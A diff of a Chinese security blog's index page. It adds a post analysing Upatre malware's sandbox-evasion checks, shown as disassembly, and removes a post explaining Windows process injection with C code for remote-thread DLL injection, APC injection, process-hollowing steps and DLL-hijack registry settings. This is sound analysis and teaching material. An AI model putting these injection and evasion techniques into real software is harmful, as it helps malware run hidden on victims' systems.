@@ -131,7 +131,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">53</span>
+          <span class="site-state-item-count">54</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -199,6 +199,88 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/anti_sandbox/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="henices">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安全代码">
+      <meta itemprop="description" content="">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 安全代码">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/03/19/anti_sandbox/" class="post-title-link" itemprop="url">一些反沙盒的新技术</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>Upatre 使用了一些新的逃逸技术来逃逸动态沙盒引擎的检查，这些技巧都非常的简单，但<br>是非常的有效果。事实上，VirusTotal上Upatre的检出率并不高，新变种出来基本都检测不<br>出来，说明现在的恶意软件对付杀毒软件是越来越有办法了。</p>
+<p>目前在恶意软件上加壳倒是越来越少了，因为加壳容易引起杀软引擎的注意，相反地目前的<br>恶意软件大量使用边执行边修改自身代码的方法来躲避杀软，不执行的话看起来就像是一个<br>正常的软件，而真正执行起来代码却全变了，这也算是一种进化。</p>
+<p>下面说说两种最近遇到的沙盒逃逸的办法，样本md5: ac3558b973402ef6a27e03c391f20533</p>
+<h2 id="检查开机时间"><a href="#检查开机时间" class="headerlink" title="检查开机时间"></a>检查开机时间</h2><p>一般使用沙盒的分析引擎的做法都是安装一个全新的系统，做系统镜像。然后在检查的时候<br>加载镜像，执行样本。而开机的时间往往都被忽略了，基本都不会超过10分钟。</p>
+<p>Upatre 样本所采取的方法是利用GetTickCount 获取开机的毫秒数，当开机时间小于12分钟<br>是就不执行恶意的行为。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">004013B3    BB D8FE0A00         MOV EBX,0AFED8</span><br><span class="line">004013B8    FF55 DC             CALL DWORD PTR SS:[EBP-24]   ; kernel32.GetTickCount</span><br><span class="line">004013BB    3BC3                CMP EAX,EBX</span><br><span class="line">004013BD    0F82 6F020000       JB 00401632</span><br><span class="line"></span><br><span class="line">00401632    6A 00               PUSH 0</span><br><span class="line">00401634    FF55 F4             CALL DWORD PTR SS:[EBP-C]    ; kernel32.ExitProcess</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>0xAFED8 是 720600毫秒 12分钟多一点，不到进程退出了。</p>
+<h2 id="检查鼠标位置"><a href="#检查鼠标位置" class="headerlink" title="检查鼠标位置"></a>检查鼠标位置</h2><p>Upatre样本使用的第二种沙盒逃逸的方法是检查鼠标位置的变化，动态沙盒分析系统大多是<br>自动化的系统，也就是不使用鼠标，如果Upatre样本检查到鼠标的位置没有发生变化，同样<br>不会执行恶意行为。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0040197C   8D85 04FFFFFF       lea eax,dword ptr ss:[ebp-0xFC]</span><br><span class="line">00401982   50                  push eax</span><br><span class="line">00401983   FF95 20FFFFFF       call dword ptr ss:[ebp-0xE0]      ;  user32.GetCursorPos</span><br><span class="line">00401989   8D85 0CFFFFFF       lea eax,dword ptr ss:[ebp-0xF4]</span><br><span class="line">0040198F   50                  push eax</span><br><span class="line">00401990   FF95 20FFFFFF       call dword ptr ss:[ebp-0xE0]      ;  user32.GetCursorPos</span><br><span class="line">00401996   8B85 04FFFFFF       mov eax,dword ptr ss:[ebp-0xFC]</span><br><span class="line">0040199C   8B9D 0CFFFFFF       mov ebx,dword ptr ss:[ebp-0xF4]</span><br><span class="line">004019A2   39D8                cmp eax,ebx</span><br><span class="line">004019A4   74 D6               je short 62.0040197C</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>只要鼠标一动就退出循环，继续往下执行。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最近出现的样本在反动态沙盒检测方面明显地进化了，针对性极强，不再局限于古老的<br>IsDebuggerPresent，而是利用PEB检查CPU核数等技术办法来检测，沙盒对抗估技术在后面<br>的日子里一定会更加迅速的进化。</p>
+<h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>非常感谢西安研究中心的同事提供的样本，同时感谢同事lzx在样本分析时给予的大力支持。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1163,174 +1245,6 @@
 <li><a target="_blank" rel="noopener" href="https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF">https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF</a></li>
 <li><a target="_blank" rel="noopener" href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-manually-create-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-manually-create-pdf.html</a></li>
 <li><a target="_blank" rel="noopener" href="https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html">https://mariomalwareanalysis.blogspot.com/2012/02/how-to-embed-javascript-into-pdf.html</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2020/03/19/process_injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="henices">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="安全代码">
-      <meta itemprop="description" content="">
-    </span>
-    
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 安全代码">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2020/03/19/process_injection/" class="post-title-link" itemprop="url">Windows 进程注入</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2020-03-19 16:34:31" itemprop="dateCreated datePublished" datetime="2020-03-19T16:34:31+08:00">2020-03-19</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="1-Process-Injection-方法总结"><a href="#1-Process-Injection-方法总结" class="headerlink" title="1. Process Injection 方法总结"></a>1. Process Injection 方法总结</h2><p>  进程注入是windows病毒和恶意软件最常用的手法之一，Windows下进程注入的方法比较<br>多，这里介绍常见的一些方法，以及相应的检查手段。</p>
-<h3 id="1-1-SetWindowsHookEx"><a href="#1-1-SetWindowsHookEx" class="headerlink" title="1.1 SetWindowsHookEx"></a>1.1 SetWindowsHookEx</h3><p> SetWindowsHookEx估计是大家最熟悉的方法了，这个是微软提供给我们使用正规用法。<br>往Windows的hook chain中安装hook 例程，监控系统某种类型的event, 使用这种方法需要<br>实现一个dll。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HHOOK WINAPI <span class="title function_">SetWindowsHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_  <span class="type">int</span> idHook,</span></span><br><span class="line"><span class="params">  _In_  HOOKPROC lpfn,</span></span><br><span class="line"><span class="params">  _In_  HINSTANCE hMod,</span></span><br><span class="line"><span class="params">  _In_  DWORD dwThreadId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>dwThread 为0，将监管系统中所有线程。</li>
-<li>idHook        指定监控event的类型</li>
-<li>hMod          dll句柄</li>
-<li>lpfn          hook例程的指针</li>
-</ul>
-<p>MSDN给出了一个使用的例子：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HOOKPROC hkprcSysMsg;</span><br><span class="line"><span class="type">static</span> HINSTANCE hinstDLL; </span><br><span class="line"><span class="type">static</span> HHOOK hhookSysMsg; </span><br><span class="line"> </span><br><span class="line">hinstDLL = <span class="built_in">LoadLibrary</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;c:\\myapp\\sysmsg.dll&quot;</span>)); </span><br><span class="line">hkprcSysMsg = (HOOKPROC)<span class="built_in">GetProcAddress</span>(hinstDLL, <span class="string">&quot;SysMessageProc&quot;</span>); </span><br><span class="line"></span><br><span class="line">hhookSysMsg = <span class="built_in">SetWindowsHookEx</span>( </span><br><span class="line">                    WH_SYSMSGFILTER,</span><br><span class="line">                    hkprcSysMsg,</span><br><span class="line">                    hinstDLL,</span><br><span class="line">                    <span class="number">0</span>); </span><br></pre></td></tr></table></figure>
-
-<p>值得一提的是这个API只能监控GUI程序，console的程序是监控不了。当年使用的时候还吃<br>了亏。</p>
-<h3 id="1-2-lpk-dll"><a href="#1-2-lpk-dll" class="headerlink" title="1.2 lpk.dll"></a>1.2 lpk.dll</h3><p> 这是一种比较常见的方法，一般把这种方法称为 dll 劫持 (dll hijack),lpk.dll默认<br>的位置在，如果在其他的路径发现lpk.dll就需要需要注意了。</p>
-<p>  这种方法需要实现和原始的lpk.dll一样导出函数，每个函数都转向调用真正的lpk.dll<br>中的导出函数，这样对于程序来说是完全感觉不到什么异常变化的，但是却被伪造的lpk.dll<br>过了一道，所以称为为劫持。</p>
-<p>  这里有二个问题，值得思考。</p>
-<h4 id="如何能让程序加载我们的lpk-dll而不是系统真正的dll"><a href="#如何能让程序加载我们的lpk-dll而不是系统真正的dll" class="headerlink" title="如何能让程序加载我们的lpk.dll而不是系统真正的dll"></a>如何能让程序加载我们的lpk.dll而不是系统真正的dll</h4><p>  如果知道Windows查找dll的顺序，就很容易解决这个问题了，微软的MSDN网站很贴心地<br>  回答了我们的问题。</p>
-<p> <a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a. The directory from which the application loaded.</span><br><span class="line">b. The current directory.</span><br><span class="line">c. The system directory. Use the GetSystemDirectory function to get the path of this directory.</span><br><span class="line">d. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.</span><br><span class="line">e. The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.</span><br><span class="line">f. The directories that are listed in the PATH environment variable. Note that</span><br><span class="line">   this does not include the per-application path specified by the App</span><br><span class="line">   Paths registry key. The App Paths key is not used when computing the DLL</span><br><span class="line">   search path.</span><br></pre></td></tr></table></figure>
-<p>因此把lpk.dll放到运行的程序同一目录即可。</p>
-<h4 id="为什么选取lpk-dll"><a href="#为什么选取lpk-dll" class="headerlink" title="为什么选取lpk.dll"></a>为什么选取lpk.dll</h4><p>  Windows 7 开始，默认已经不加载LPK.dll了，要Windows 7 默认加载LPK.dll<br>  需要修改注册表，导入下面的注册表, 重启后生效</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]</span><br><span class="line">&quot;ExcludeFromKnownDlls&quot;=hex(7):6c,00,70,00,6b,00,2e,00,64,00,6c,00,6c,00,00,00,00,00</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="1-3-CreateRemoteThread"><a href="#1-3-CreateRemoteThread" class="headerlink" title="1.3  CreateRemoteThread"></a>1.3  CreateRemoteThread</h3><p>   CreateRemoteThread应该是非常常用的进程注入方法了，有两种常见的使用方法。API<br>原型如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function">HANDLE WINAPI <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_   DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">_Out_  LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>hProcess        要注入的进程的句柄</li>
-<li>lpStartAddress  远程进程中执行的函数的地址（指针）</li>
-<li>lpParameter     远程进程中执行的函数的参数的地址 （指针）</li>
-</ul>
-<h4 id="实现个DLL"><a href="#实现个DLL" class="headerlink" title="实现个DLL"></a>实现个DLL</h4><p>  第一种方法同样是跨进程调用LoadLibrary加载指定的DLL，我们自己实现一个DLL，就可以为所欲为了，呵呵。</p>
-<p>   从API原型中可以看出，需要把数据写入远程的进程，Windows系统提供了WriteProcssMemory<br>来干这个事，但是如何能够保证我们往远程进程写的地址是可写的呢?</p>
-<p>   答案是无法保证。。。所以比较稳妥的方法是我们自己在远程进程中申请一块可写的内<br>存，然后把我们的数据写到远程进程中去。</p>
-<p>   在远程进程中申请内存也有相应的API VirtualAllocEx, 把前前后后都串起来就可以远<br>程注入DLL了。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">HANDLE process = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, procID);</span><br><span class="line"><span class="keyword">if</span> (process == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the specified process couldn&#x27;t be found.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Get address of the LoadLibrary function.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LPVOID addr = (LPVOID)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the LoadLibraryA function was not found inside kernel32.dll library.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Allocate new memory region inside the process&#x27;s address space.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LPVOID arg = (LPVOID)<span class="built_in">VirtualAllocEx</span>(process, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (arg == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the memory could not be allocated inside the chosen process.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Write the argument to LoadLibraryA to the process&#x27;s newly allocated memory region.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> n = <span class="built_in">WriteProcessMemory</span>(process, arg, buffer, <span class="built_in">strlen</span>(buffer), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: there was no bytes written to the process&#x27;s address space.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Inject our DLL into the process&#x27;s address space.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">HANDLE threadID = <span class="built_in">CreateRemoteThread</span>(process, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)addr, arg, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (threadID == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error: the remote thread could not be created.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Success: the remote thread was successfully created.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Close the handle to the process, becuase we&#x27;ve already injected the DLL.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(process);</span><br></pre></td></tr></table></figure>
-
-<p>   前面的代码示例代码，看起来很正常，基本上CreateRemoteThread的例子都是这么写的<br>但是如果如何看的仔细，还是会发现一个问题，不是说lpStartAddress必须是远程进程中<br>的地址吗，可是LoadLibraryA的地址是注入进程的地址不是远程进程中的地址。</p>
-<p>  很多文章在这里都没有说透，但是牛书《Windows核心编程》对此有着详细的说明。根据<br>经验Windows系统总是把Kernel32.dll映射到进程的相同地址，Windows开启ASLR后，重启后<br>进程中Kernel32.dll的地址会发生变化，但是每个进程中Kernel32.dll的地址仍然相同！<br>所以我们可以在远程的进程使用本地进程的内存中的LoadLibraryA的地址。</p>
-<h4 id="写远程进程内存"><a href="#写远程进程内存" class="headerlink" title="写远程进程内存"></a>写远程进程内存</h4><p>   第二种方法是直接远程注入代码,不注入DLL,其实并不一定要调用CreateRemoteThread<br>还有好几种替代方法,</p>
-<ol>
-<li>CreateRemoteThread最终会调用NtCreateThreadEx Native API，可以直接调用这个<br>  Native API来启动远程的线程。</li>
-<li>RtlCreateUserThread</li>
-</ol>
-<h3 id="1-4-AppInit-DLLs"><a href="#1-4-AppInit-DLLs" class="headerlink" title="1.4 AppInit_DLLs"></a>1.4 AppInit_DLLs</h3><p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code></p>
-<p>   这个键值被《Windows核心编程》介绍而格外出名，可执行文件在处理User32.dll的<br>DLL_PROCESS_ATTACH 时，会使用LoadLibirary加载AppInit_DLLS, 不链接User32.dll的程<br>序将不会加载AppInit_DLLS, 很少程序不需要链接User32.dll</p>
-<p>新版本的Windows增加了几个关键的键值，会对DLL的注入有影响。</p>
-<p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs</code></p>
-<ul>
-<li>REG_DWORD 1 表示全局开启</li>
-<li>REG_DWORD 0 表示全局关闭</li>
-</ul>
-<p><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\RequireSignedAppInit_DLLs</code></p>
-<ul>
-<li>REG_DWORD 0 加载任意DLL</li>
-<li>REG_DWORD 1 只加载签名的DLL</li>
-</ul>
-<h3 id="1-5-QueueUserApc"><a href="#1-5-QueueUserApc" class="headerlink" title="1.5 QueueUserApc"></a>1.5 QueueUserApc</h3><p>QueueUserApc API 原型如下：</p>
-<p>DWORD WINAPI QueueUserAPC(<br>  <em>In</em>  PAPCFUNC pfnAPC,    &#x2F;&#x2F; APC function<br>  <em>In</em>  HANDLE hThread,     &#x2F;&#x2F; handle of thread<br>  <em>In</em>  ULONG_PTR dwData    &#x2F;&#x2F; APc function parameter<br>);</p>
-<p>这个注入方法用的不多，但是也是老方法了，pjf在2007年《暴力注入explorer》的文章里<br>就提到了这种方法。作用是在线程的Apc队列插入一个用户模式下的APC 对象。</p>
-<p>APC 是 asynchronous procedure call 的缩写，每个线程都有自己的APC队列，在线程APC<br>队列中的APC对象的函数将被线程执行，但是用户模式下的APC对象里的函数并不一定会马上<br>执行（所以是异步的），除非线程是alertable状态。当线程是alertable状态是，APC队列<br>里的Apc对象，按照FIFO的顺序进行处理，执行APC函数。线程调用 SleepEx,<br>SignalObjectAndWait, WaitForSingleObjectEx, WaitForMultipleObjectsEx 或者<br>MsgWaitForMultipleObjectsEx时线程进入alertable状态。</p>
-<p>所以为了我们的函数能够尽快的执行，我们必须在目标进程所有的线程的APC队列中插入<br>APC 对象，基本上总有一个线程是alertable状态。</p>
-<p>核心伪代码如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">DWORD ret;</span><br><span class="line"><span class="type">char</span> *DllName = <span class="string">&#x27;c:\\MyDll.dll&#x27;</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(DllName) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">PVOID param = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, len, MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (param != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WriteProcessMemory</span>(hProcess, param, (LPVOID)DllName, len, &amp;ret)) &#123;</span><br><span class="line">  <span class="keyword">for</span> (DWORD p = <span class="number">0</span>; p &lt; NumberOfThreads; p ++) &#123;</span><br><span class="line">    hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, <span class="number">0</span>, ThreadId[p]);</span><br><span class="line">    <span class="keyword">if</span> (hThread != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">InjectDll</span>(hProcess, hThread, (DWORD)param);</span><br><span class="line">      <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InjectDll</span><span class="params">(HANDLE hProcess, HANDLE hThread, DWORD param)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">QueueUserAPC</span>((PAPCFUNC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&#x27;kernel32.dll&#x27;</span>, <span class="string">&#x27;LoadLibraryA&#x27;</span>, hThread, (DWORD)param）;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-6-ZwMapViewOfSection"><a href="#1-6-ZwMapViewOfSection" class="headerlink" title="1.6 ZwMapViewOfSection"></a>1.6 ZwMapViewOfSection</h3><p>这是最近出现的比较新的进程注入方法，在2014年左右有样本开始使用这种方法注入进程。<br>这种技术的本质是进程替换，使用合法的正常进程，执行的确是恶意的代码。</p>
-<p>基本步骤如下：</p>
-<ol>
-<li>使用CREATE_SUSPENDED调用CreateProcessW创建进程</li>
-<li>使用ZwUnmapViewOfSection卸载进程空间中的原始代码</li>
-<li>使用VirtualAllocEx分配内存，确保分配区域可写可执行</li>
-<li>使用WriteProcessMemory在分配区域内写入恶意代码</li>
-<li>使用SetThreadContext设置线程内容为指定的恶意代码</li>
-<li>使用ResumeThread回复进程执行</li>
-</ol>
-<p>代码中用到PEB的结构：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;dt nt!_PEB</span><br><span class="line">+0x000 InheritedAddressSpace : UChar</span><br><span class="line">+0x001 ReadImageFileExecOptions : UChar</span><br><span class="line">+0x002 BeingDebugged : UChar</span><br><span class="line">+0x003 SpareBool : UChar</span><br><span class="line">+0x004 Mutant : Ptr32 Void</span><br><span class="line">+0x008 ImageBaseAddress : Ptr32 Void</span><br></pre></td></tr></table></figure>
-<p>示例代码：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 